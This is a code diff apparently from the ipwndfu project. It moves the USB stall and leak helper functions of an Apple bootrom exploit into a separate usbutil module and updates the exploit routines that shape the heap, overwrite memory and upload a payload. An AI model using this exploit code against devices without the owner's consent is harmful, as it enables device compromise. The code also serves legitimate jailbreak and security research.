@@ -14,7 +14,7 @@ from typing import TYPE_CHECKING, Optional, Tuple, Union
 
 import usb  # type: ignore
 
-from ipwndfu import device_platform, dfu
+from ipwndfu import device_platform, dfu, usbutil
 from ipwndfu.utilities import from_hex_str
 
 if TYPE_CHECKING:
@@ -275,30 +275,6 @@ def prepare_shellcode(name: str, constants: list[int]) -> bytes:
     return shellcode[:placeholders_offset] + struct.pack(
         fmt % len(constants), *constants
     )
-
-
-def stall(device: "Device") -> None:
-    libusb1_async_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, b"A" * 0xC0, 0.00001)
-
-
-def leak(device: "Device"):
-    libusb1_no_error_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 0xC0, 1)
-
-
-def no_leak(device: "Device") -> None:
-    libusb1_no_error_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 0xC1, 1)
-
-
-def usb_req_stall(device: "Device") -> None:
-    libusb1_no_error_ctrl_transfer(device, 0x2, 3, 0x0, 0x80, 0x0, 10)
-
-
-def usb_req_leak(device: "Device") -> None:
-    libusb1_no_error_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 0x40, 1)
-
-
-def usb_req_no_leak(device: "Device"):
-    libusb1_no_error_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 0x41, 1)
 
 
 PAYLOAD_OFFSET_ARMV7 = 0x180
@@ -716,17 +692,17 @@ def exploit(match: None = None) -> None:
     payload, config = exploit_config(device.serial_number)
 
     if config.large_leak is not None:
-        usb_req_stall(device)
+        usbutil.usb_req_stall(device)
         for _ in range(config.large_leak):
-            usb_req_leak(device)
-        usb_req_no_leak(device)
+            usbutil.usb_req_leak(device)
+        usbutil.usb_req_no_leak(device)
     else:
-        stall(device)
+        usbutil.stall(device)
         if config.hole:
             for _ in range(config.hole):
-                no_leak(device)
-        usb_req_leak(device)
-        no_leak(device)
+                usbutil.no_leak(device)
+        usbutil.usb_req_leak(device)
+        usbutil.no_leak(device)
     dfu.usb_reset(device)
     dfu.release_device(device)
 
@@ -743,13 +719,13 @@ def exploit(match: None = None) -> None:
 
     device = dfu.acquire_device(match=match)
     assert device
-    usb_req_stall(device)
+    usbutil.usb_req_stall(device)
     if config.large_leak is not None:
-        usb_req_leak(device)
+        usbutil.usb_req_leak(device)
     else:
         if config.leak:
             for _ in range(config.leak):
-                usb_req_leak(device)
+                usbutil.usb_req_leak(device)
     libusb1_no_error_ctrl_transfer(device, 0, 0, 0, 0, config.overwrite, 100)
     for i in range(0, len(payload), 0x800):
         libusb1_no_error_ctrl_transfer(
@@ -784,16 +760,18 @@ def exploit_a8_a9(match=None):
         payload_a8_a9 = payload(0x8003)
     elif "CPID:7000" in device.serial_number:
         payload_a8_a9 = payload(0x7000)
+    else:
+        payload_a8_a9 = None
 
-    if payload_a8_a9 is None:
+    if not payload_a8_a9:
         raise NotImplementedError(
             f"exploit_a8_a9 does not support {device.serial_number}"
         )
 
-    stall(device)
-    leak(device)
+    usbutil.stall(device)
+    usbutil.leak(device)
     for _ in range(40):
-        no_leak(device)
+        usbutil.no_leak(device)
     dfu.usb_reset(device)
     dfu.release_device(device)
 
@@ -807,10 +785,10 @@ def exploit_a8_a9(match=None):
     time.sleep(0.5)
 
     device = dfu.acquire_device(match=match)
-    usb_req_stall(device)
-    usb_req_leak(device)
-    usb_req_leak(device)
-    usb_req_leak(device)
+    usbutil.usb_req_stall(device)
+    usbutil.usb_req_leak(device)
+    usbutil.usb_req_leak(device)
+    usbutil.usb_req_leak(device)
     libusb1_no_error_ctrl_transfer(device, 0, 0, 0, 0, overwrite, 100)
     for i in range(0, len(payload_a8_a9), 0x800):
         libusb1_no_error_ctrl_transfer(
